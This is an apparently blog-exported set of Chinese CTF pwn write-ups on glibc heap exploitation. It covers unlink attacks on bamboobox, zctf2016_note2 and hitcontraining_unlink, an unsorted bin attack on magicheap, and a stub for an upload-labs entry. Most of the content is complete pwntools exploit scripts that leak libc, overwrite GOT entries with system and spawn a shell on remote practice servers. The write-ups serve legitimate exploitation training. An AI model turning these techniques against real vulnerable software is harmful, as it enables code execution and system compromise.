<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a><em>exp</em></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level=&quot;debug&quot;</span></span><br><span class="line"><span class="comment"># p = process(&quot;./a&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">25170</span>)</span><br><span class="line">debug(p,<span class="number">0x400E84</span>,<span class="number">0x400E90</span>,<span class="number">0x400E9C</span>,<span class="number">0x400EA8</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please enter the length of item name:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please enter the name of item:&quot;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    p.sendafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Please enter the index of item:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Please enter the length of item name:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Please enter the new name of the item:&quot;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please enter the index of item:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">unlink_chunk_hook = <span class="number">0x6020c8</span></span><br><span class="line">fd = unlink_chunk_hook-<span class="number">0x18</span></span><br><span class="line">bk = unlink_chunk_hook-<span class="number">0x10</span></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;c&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">2</span>+p64(fd)+p64(bk)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0x30</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x50</span>,payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0 : &#x27;</span>)</span><br><span class="line">libc_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = libc_addr-<span class="number">0x3c48e0</span></span><br><span class="line">log_addr(<span class="string">&quot;libc_base&quot;</span>)</span><br><span class="line">payload = p64(libc_addr)+p64(<span class="number">0</span>)+p64(<span class="number">0x30</span>)+p64(elf.got[<span class="string">&#x27;free&#x27;</span>])</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x30</span>,payload)</span><br><span class="line">system_addr = libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x10</span>,p64(system_addr))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="zctf2016-note2"><a href="#zctf2016-note2" class="headerlink" title="zctf2016_note2"></a><em>zctf2016_note2</em></h2><h3 id="学习与收获"><a href="#学习与收获" class="headerlink" title="学习与收获"></a>学习与收获</h3><ol>
<li>将要<code>free</code>的_chunk_，称**<code>inuse0_chunk</code><strong>。而<code>inuse0_chunk</code>的<code>prev_size</code>字段，则表示前面所有空闲（</strong>要被合并**）的_chunk_的<code>user_data_size</code>。<br><code>inuse0_chunk_prev_size = all_chunk_user_data_size</code></li>
<li>_strcpy_以空字符<code>0</code>作为结束标志</li>
</ol>
<h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><p>如果在创建_chunk_时，创建<code>size = 0</code>的_chunk_，那么在_edit_该_chunk_时，便可实现溢出。要注意_edit_中的<code>strcpy</code>函数，会被<code>00</code>截断。</p>
<h4 id="edit"><a href="#edit" class="headerlink" title="edit"></a><em>edit</em></h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">edit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+8h] [rbp-E8h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+Ch] [rbp-E4h]</span></span><br><span class="line">  <span class="type">char</span> *src; <span class="comment">// [rsp+10h] [rbp-E0h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+18h] [rbp-D8h]</span></span><br><span class="line">  <span class="type">char</span> dest[<span class="number">128</span>]; <span class="comment">// [rsp+20h] [rbp-D0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> *v7; <span class="comment">// [rsp+A0h] [rbp-50h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+D8h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Input the id of the note:&quot;</span>);</span><br><span class="line">    v2 = sub_400A4A();   <span class="comment">//v2是index</span></span><br><span class="line">    <span class="keyword">if</span> ( v2 &gt;= <span class="number">0</span> &amp;&amp; v2 &lt;= <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      src = *(&amp;ptr + v2);   <span class="comment">//src是chunk的user_data区域</span></span><br><span class="line">      v5 = qword_602140[v2];</span><br><span class="line">      <span class="keyword">if</span> ( src )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;do you want to overwrite or append?[1.overwrite/2.append]&quot;</span>);</span><br><span class="line">        v3 = sub_400A4A();   <span class="comment">//v3是上面选择的1/2</span></span><br><span class="line">        <span class="keyword">if</span> ( v3 == <span class="number">1</span> || v3 == <span class="number">2</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( v3 == <span class="number">1</span> )</span><br><span class="line">            dest[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">strcpy</span>(dest, src);</span><br><span class="line"><span class="comment">/*          v7 = malloc(0xA0uLL);</span></span><br><span class="line"><span class="comment">          strcpy(v7, &quot;TheNewContents:&quot;);</span></span><br><span class="line"><span class="comment">          printf(v7);                                                                  */</span></span><br><span class="line">          sub_4009BD((v7 + <span class="number">15</span>), <span class="number">144LL</span>, <span class="number">10</span>);</span><br><span class="line">          sub_400B10(v7 + <span class="number">15</span>);   <span class="comment">//v7+15是我们输入的要edit的数据</span></span><br><span class="line">          v0 = v7;</span><br><span class="line">          v0[v5 - <span class="built_in">strlen</span>(dest) + <span class="number">14</span>] = <span class="number">0</span>;</span><br><span class="line">          <span class="built_in">strncat</span>(dest, v7 + <span class="number">15</span>, <span class="number">0xFFFFFFFFFFFFFFFFL</span>L);</span><br><span class="line">            <span class="comment">//程序将我们edit的数据v7+15，strncat拼接，到dest的末尾</span></span><br><span class="line">          <span class="built_in">strcpy</span>(src, dest);</span><br><span class="line">            <span class="comment">//将dest区域的数据,strcpy复制,到src(chunk的user_data区域)。</span></span><br><span class="line">            <span class="comment">//strcpy以空字符0作为结束标志</span></span><br><span class="line">          <span class="built_in">free</span>(v7);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="利用思路-2"><a href="#利用思路-2" class="headerlink" title="利用思路"></a>利用思路</h3><p>本题需要向前合并<code>2</code>个_chunk_，因为我们没有办法往_chunk1_中写入<code>payload</code>。_chunk0_用来布置_fd_和_bk_；_chunk1_用来设置_chunk2_的_prev_inuse_和_precv_size_字段；_chunk2_用来向前合并_chunk_；_chunk3_用来，防止<code>delete(2)</code>时与_Top chunk_合并。</p>
<p>创建<code>4</code>个_chunk_，把_chunk0_作为_unlink_chunk_，并直接写入_fd_和_bk_到_chunk0_中。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">unlink_chunk_hook = <span class="number">0x602120</span></span><br><span class="line">fd = unlink_chunk_hook-<span class="number">0x18</span></span><br><span class="line">bk = unlink_chunk_hook-<span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">paylaod = p64(<span class="number">0</span>)*<span class="number">2</span>+p64(fd)+p64(bk)+<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">add(<span class="number">0x30</span>,paylaod)</span><br><span class="line">add(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>设置_chunk2_的_prev_inuse_位为<code>0</code>，使_chunk1_空闲。设置_chunk2_的_prev_size_为<code>0x50</code>，当<code>delete(2)</code>时，会向前合并<code>0x70</code>的内存。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">paylaod = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x18</span>+<span class="string">b&#x27;\x90&#x27;</span></span><br><span class="line">edit(<span class="number">1</span>,paylaod)</span><br><span class="line">num = <span class="number">7</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):   </span><br><span class="line">    edit(<span class="number">1</span>,<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x10</span>+<span class="string">b&#x27;B&#x27;</span>*num)</span><br><span class="line">    num = num-<span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(num)</span><br><span class="line">paylaod = <span class="string">b&#x27;B&#x27;</span>*<span class="number">0x10</span>+<span class="string">b&#x27;\x50&#x27;</span></span><br><span class="line">edit(<span class="number">1</span>,paylaod)</span><br><span class="line">delete(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>

<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a><em>exp</em></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p = process(&quot;./note2&quot;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./note2&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">25053</span>)</span><br><span class="line">debug(p,<span class="number">0x401032</span>,<span class="number">0x401040</span>,<span class="number">0x401047</span>)</span><br><span class="line"><span class="comment"># context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;option---&gt;&gt;\n&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Input the length of the note content:(less than 128)\n&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Input the note content:\n&quot;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;option---&gt;&gt;\n&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Input the id of the note:\n&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;option---&gt;&gt;\n&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Input the id of the note:\n&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;do you want to overwrite or append?[1.overwrite/2.append]\n&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;TheNewContents:&quot;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;option---&gt;&gt;\n&quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Input the id of the note:\n&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Input your name:\n&quot;</span>,<span class="string">b&#x27;kim&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Input your address:\n&quot;</span>,<span class="string">b&#x27;wen&#x27;</span>)</span><br><span class="line">free_chunk_hook = <span class="number">0x602120</span></span><br><span class="line">fd = free_chunk_hook-<span class="number">0x18</span></span><br><span class="line">bk = free_chunk_hook-<span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">paylaod = p64(<span class="number">0</span>)*<span class="number">2</span>+p64(fd)+p64(bk)+<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">add(<span class="number">0x30</span>,paylaod)</span><br><span class="line">add(<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">paylaod = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x18</span>+<span class="string">b&#x27;\x90&#x27;</span></span><br><span class="line">edit(<span class="number">1</span>,paylaod)</span><br><span class="line">num = <span class="number">7</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    edit(<span class="number">1</span>,<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x10</span>+<span class="string">b&#x27;B&#x27;</span>*num)</span><br><span class="line">    num = num-<span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(num)</span><br><span class="line">paylaod = <span class="string">b&#x27;B&#x27;</span>*<span class="number">0x10</span>+<span class="string">b&#x27;\x50&#x27;</span></span><br><span class="line">edit(<span class="number">1</span>,paylaod)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">one_gadget = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">paylaod = <span class="string">b&#x27;C&#x27;</span>*<span class="number">0x18</span>+p64(elf.got[<span class="string">&#x27;free&#x27;</span>])</span><br><span class="line">edit(<span class="number">0</span>,paylaod)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-libc.sym[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">log_addr(<span class="string">&quot;libc_base&quot;</span>)</span><br><span class="line">system = libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">edit(<span class="number">0</span>,p64(system))</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="hitcontraining-unlink"><a href="#hitcontraining-unlink" class="headerlink" title="hitcontraining_unlink"></a><em>hitcontraining_unlink</em></h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ol>
<li>修改_fd_，<em>bk_指针，然后触发_unlink</em></li>
<li>泄漏函数真实地址</li>
<li>覆盖_atoi@got_值为_system_的地址，发送<code>&#39;/bin/sh\x00&#39;</code>调用_atoi_函数</li>
</ol>
<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a><em>exp</em></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p = process(&#x27;./bamboobox&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">25863</span>)</span><br><span class="line">debug(p,<span class="number">0x400E90</span>,<span class="number">0x400E9C</span>,<span class="number">0x400EA8</span>,<span class="number">0x400cdd</span>)</span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./bamboobox&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    <span class="comment"># p.sendlineafter(&quot;&quot;)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please enter the length of item name:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please enter the name of item:&quot;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please enter the index of item:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please enter the length of item name:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please enter the new name of the item:&quot;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Please enter the index of item:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">fake_chunk = <span class="number">0x6020c8</span></span><br><span class="line">fd = <span class="number">0x6020b0</span></span><br><span class="line">bk = <span class="number">0x6020b8</span></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">b&#x27;c&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>)+p64(fd)+p64(bk)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0x30</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x80</span>,payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0x30</span>)+p64(elf.got[<span class="string">&#x27;atoi&#x27;</span>])</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x30</span>,payload)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0 : &#x27;</span>)</span><br><span class="line">atoi_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log_addr(<span class="string">&quot;atoi_addr&quot;</span>)</span><br><span class="line"></span><br><span class="line">libc_base = atoi_addr-libc.sym[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">log_addr(<span class="string">&quot;libc_base&quot;</span>)</span><br><span class="line">system_addr = libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x8</span>,p64(system_addr))</span><br><span class="line">p.recvuntil(<span class="string">&quot;Your choice:&quot;</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>pwn学习总结</category>
        <category>堆</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>堆</tag>
      </tags>
  </entry>
  <entry>
    <title>unsorted bin attack学习笔记</title>
    <url>/2024/07/09/unsorted-bin-attack%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>[TOC]</p>
<span id="more"></span>

<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><blockquote>
<p>Unsorted Bin Attack，顾名思义，该攻击与 Glibc 堆管理中的的 Unsorted Bin 的机制紧密相关。</p>
<p>Unsorted Bin Attack 被利用的前提是控制 Unsorted Bin Chunk 的 bk 指针。</p>
<p>Unsorted Bin Attack 可以达到的效果是实现修改任意地址值为一个较大的数值。</p>
</blockquote>
<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p><code>hitcontraining_magicheap</code></p>
<h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><h4 id="main"><a href="#main" class="headerlink" title="main"></a><em>main</em></h4><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503252042969.png" alt="image-20240708114125665" style="zoom:67%;" />

<h4 id="exit-heap"><a href="#exit-heap" class="headerlink" title="exit_heap"></a><em>exit_heap</em></h4><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503252042712.png" alt="image-20240708113615058" style="zoom:67%;" />

<h4 id="read-input"><a href="#read-input" class="headerlink" title="read_input"></a><em>read_input</em></h4><p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503252042653.png" alt="image-20240708113219495"></p>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>​	先申请三个<em>chunk</em>，然后<em>free</em>掉<em>chunk1</em>。<em>chunk2</em>的作用是防止<em>free chunk1</em>后，<em>chunk0</em>与<em>top chunk</em>合并。<code>fast bin</code>中的<em>chunk</em>大小的范围在 <code>0x20~0x80</code> 之间，所以我们我们在申请第二个<em>chunk</em>的时候其大小要大于0x80，才能使<em>free chunk1</em>后<em>chunk1</em>在<code>unsorted bin</code>中。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x30</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;cccc&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>如图：</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503252042218.png" alt="image-20240708111057915" style="zoom:80%;" />

<p>​	堆溢出，写入<em>0x602090</em>。<em>magic</em>的地址是<em>0x6020a0</em>，由于需要<em>0x10</em>个字节来存放<code>prve size</code>和<code>size</code>，所以我们写入的是<em>0x602090</em>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x602090</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x50</span>,payload)</span><br></pre></td></tr></table></figure>

<p>如图：</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503252042515.png" alt="image-20240708111250104"></p>
<p>然后再<em>malloc</em>一个与<em>chunk1</em>同样大小的chunk，<code>unsorted_bin chunk0</code>的<code>bk</code>地址便被写到<em>magic</em>中。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>如图：</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503252042463.png" alt="image-20240708111356583"></p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a><em>exp</em></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line"><span class="comment"># p = remote(&quot;node5.buuoj.cn&quot;,27610)</span></span><br><span class="line">debug(p,<span class="number">0x400d0b</span>,<span class="number">0x400d17</span>,<span class="number">0x400d23</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Size of Heap : &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Content of heap:&quot;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Size of Heap : &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Content of heap : &quot;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x6020a0</span></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;cccc&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)+p64(<span class="number">0</span>)+p64(magic-<span class="number">0x10</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x50</span>,payload)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Your choice :&quot;</span>,<span class="built_in">str</span>(<span class="number">4869</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>pwn学习总结</category>
        <category>堆</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>堆</tag>
      </tags>
  </entry>
  <entry>
    <title>upload-labs靶场通关记录</title>
    <url>/2024/10/22/upload-labs%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p>Upload Labs 是一个基于 PHP 编写的开源靶场项目，专门用于模拟和研究文件上传漏洞。它包含多个关卡，每个关卡都模拟了不同的文件上传漏洞场景，旨在帮助用户全面了解文件上传漏洞的原理、利用方法和防御策略。</p>
<span id="more"></span>

<p>参考文章：</p>
<p><a href="https://www.cnblogs.com/henry666/p/17051491.html">全面了解文件上传漏洞, 通关upload-labs靶场! - 亨利其实很坏 - 博客园</a></p>
<p><a href="https://www.cnblogs.com/xiaoyus/articles/18250023">upload-labs通关全教程（建议萌新收藏）Web安全-文件上传漏洞超详细解析 - 白小雨 - 博客园</a></p>
